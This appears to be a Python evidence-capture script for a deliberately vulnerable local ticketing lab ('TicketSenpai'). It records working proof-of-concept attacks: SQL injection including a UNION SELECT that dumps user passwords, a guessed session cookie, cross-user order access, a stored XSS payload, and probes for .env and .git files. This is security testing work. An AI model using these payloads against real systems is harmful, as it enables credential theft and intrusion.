"""Capture local lab PoCs and headers using a disposable DB, never user data.

Run after make setup with ports 3000/5001 free. --browser keeps this disposable
instance alive for cross-user XSS verification; Ctrl+C cleans up both servers.
"""
import argparse
from datetime import datetime, timezone
import json
import os
from pathlib import Path
import signal
import socket
import subprocess
import tempfile
import time
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen

ROOT = Path(__file__).resolve().parent.parent
OUT = ROOT / 'docs/evidence'
BASE = 'http://127.0.0.1:3000'
records = []


def call(label, path, method='GET', data=None, cookie=None, expected=200, headers=None):
    headers = dict(headers or {})
    if cookie:
        headers['Cookie'] = f'session={cookie}'
    if data is not None:
        headers['Content-Type'] = 'application/json'
    req = Request(BASE + path, data=json.dumps(data).encode() if data is not None else None,
                  headers=headers, method=method)
    try:
        response = urlopen(req, timeout=30)
    except HTTPError as error:
        response = error
    with response:
        raw = response.read().decode()
        status = response.status
        response_headers = dict(response.headers.items())
    try:
        body = json.loads(raw)
    except json.JSONDecodeError:
        body = {'html_response_bytes': len(raw.encode()), 'contains_ticket_senpai': 'TicketSenpai' in raw}
    if isinstance(body, dict) and 'traceback' in body.get('error', {}):
        body['error']['traceback'] = body['error']['traceback'].replace(str(ROOT), '<PROJECT_ROOT>')
    records.append({'id': label, 'request': {'method': method, 'path': path, 'headers': headers, 'body': data},
                    'response': {'status': status, 'headers': response_headers, 'body': body}})
    if status != expected:
        raise AssertionError(f'{label}: expected HTTP {expected}, got {status}')
    return body


def capture():
    call('R01-discovery-page', '/events')
    call('R02-api-health', '/api/health')
    baseline = call('V01-baseline', '/api/events')
    injected = call('V01-exploit', '/api/events?' + urlencode({'q': "') OR 1=1 -- "}))
    assert len(baseline['items']) == 3 and len(injected['items']) == 4
    assert any(event['published'] == 0 for event in injected['items'])
    call('V01-draft-detail-control', '/api/events/4', expected=404)
    call('V06-traceback', '/api/events?' + urlencode({'q': "'broken"}), expected=500)
    call('R03-service-survives-error', '/api/health')
    union = "') UNION SELECT id,email,password,'lab','2027-01-01','lab','lab',1,1 FROM users -- "
    exposed = call('V05-http-credential-disclosure', '/api/events?' + urlencode({'q': union}))
    assert any(row['name'] == 'alice@example.test' and row['artist'] == 'alice-demo' for row in exposed['items'])
    call('C01-admin-unauthenticated', '/api/admin/events', expected=401)
    for name in ('alice', 'bob'):
        call(f'A01-login-{name}', '/api/login', 'POST', {'email': f'{name}@example.test', 'password': f'{name}-demo'})
    call('C02-admin-customer', '/api/admin/events', cookie='session-2', expected=403)
    call('V04-guessed-cookie', '/api/me', cookie='session-2')
    hold = call('B01-hold', '/api/events/1/holds', 'POST', {'seat_ids': ['A-1-1']}, 'session-1', 201,
                {'Idempotency-Key': 'evidence-hold'})
    order = call('B02-checkout', '/api/orders', 'POST', {'hold_id': hold['id'], 'payment': 'approve'}, 'session-1', 201,
                 {'Idempotency-Key': 'evidence-buy'})
    assert order['status'] == 'confirmed'
    own = call('V03-bob-list-control', '/api/orders', cookie='session-2')
    assert own['items'] == []
    disclosed = call('V03-bob-reads-alice', f'/api/orders/{order["id"]}', cookie='session-2')
    assert disclosed['buyer_name'] == 'Alice'
    payload = '<img src=x onerror="document.body.dataset.xss=\'verified\'">'
    call('V02-store-as-alice', '/api/events/1/reviews', 'POST', {'body': payload}, 'session-1', 201)
    reviews = call('V02-read-as-bob', '/api/events/1/reviews', cookie='session-2')
    assert any(row['body'] == payload for row in reviews['items'])
    call('C03-logout', '/api/logout', 'POST', cookie='session-2')
    call('C04-revoked-cookie', '/api/me', cookie='session-2', expected=401)
    call('C05-unsupported-method', '/api/events', 'DELETE', expected=405)
    call('C06-options', '/api/events', 'OPTIONS')
    call('C07-trace', '/api/events', 'TRACE', expected=405)
    call('C08-cross-origin', '/api/events', headers={'Origin': 'https://untrusted.example'})
    for path in ('/.env', '/.git/config', '/backend/instance/ticketsenpai.sqlite3', '/api/console'):
        call('C09-file-' + path, path, expected=404)
    for n in range(5):
        call(f'A02-bad-password-{n+1}', '/api/login', 'POST', {'email': 'bob@example.test', 'password': 'wrong-password'}, expected=401)
    call('A03-valid-after-failures', '/api/login', 'POST', {'email': 'bob@example.test', 'password': 'bob-demo'})


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--browser', action='store_true', help='Keep disposable servers alive for browser verification.')
    args = parser.parse_args()
    for port in (3000, 5001):
        with socket.socket() as probe:
            probe.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            probe.bind(('127.0.0.1', port))
    processes = []
    def stop(signum, frame):
        raise KeyboardInterrupt
    signal.signal(signal.SIGTERM, stop)
    OUT.mkdir(parents=True, exist_ok=True)
    with tempfile.TemporaryDirectory(prefix='ticketsenpai-security-') as directory, tempfile.TemporaryFile(mode='w+') as log:
        try:
            program = ('import sys; from ticketsenpai import create_app; '
                       'create_app(sys.argv[1]).run(host="127.0.0.1",port=5001,debug=True,use_debugger=False,use_reloader=False)')
            processes.append(subprocess.Popen([str(ROOT / 'backend/.venv/bin/python'), '-c', program, str(Path(directory) / 'lab.sqlite3')],
                                              cwd=ROOT / 'backend', stdout=log, stderr=log, start_new_session=True))
            processes.append(subprocess.Popen(['npm', 'run', 'dev'], cwd=ROOT / 'frontend', stdout=log, stderr=log, start_new_session=True))
            deadline = time.monotonic() + 60
            while True:
                if any(proc.poll() is not None for proc in processes):
                    raise RuntimeError('A disposable server exited before readiness.')
                try:
                    with urlopen(BASE + '/api/health', timeout=2) as response:
                        if response.status == 200:
                            break
                except (OSError, URLError):
                    if time.monotonic() >= deadline:
                        raise TimeoutError('Disposable lab did not become ready within 60 seconds.')
                    time.sleep(.2)
            capture()
            result = {'captured_at_utc': datetime.now(timezone.utc).isoformat(), 'scope': BASE,
                      'database': 'fresh disposable synthetic database',
                      'browser_xss': 'HTTP persistence verified; execution requires the separate browser record.',
                      'records': records}
            (OUT / 'http-results.json').write_text(json.dumps(result, indent=2) + '\n')
            print(f'PASS: {len(records)} HTTP records captured in docs/evidence/http-results.json', flush=True)
            if args.browser:
                print('Disposable lab ready for browser testing. Stop with Ctrl+C when finished.', flush=True)
                while True:
                    if any(proc.poll() is not None for proc in processes):
                        raise RuntimeError('A disposable server exited during browser testing.')
                    time.sleep(.5)
        except KeyboardInterrupt:
            pass
        finally:
            for proc in processes:
                if proc.poll() is None:
                    os.killpg(proc.pid, signal.SIGTERM)
            for proc in processes:
                try:
                    proc.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    os.killpg(proc.pid, signal.SIGKILL)
                    proc.wait()


if __name__ == '__main__':
    main()
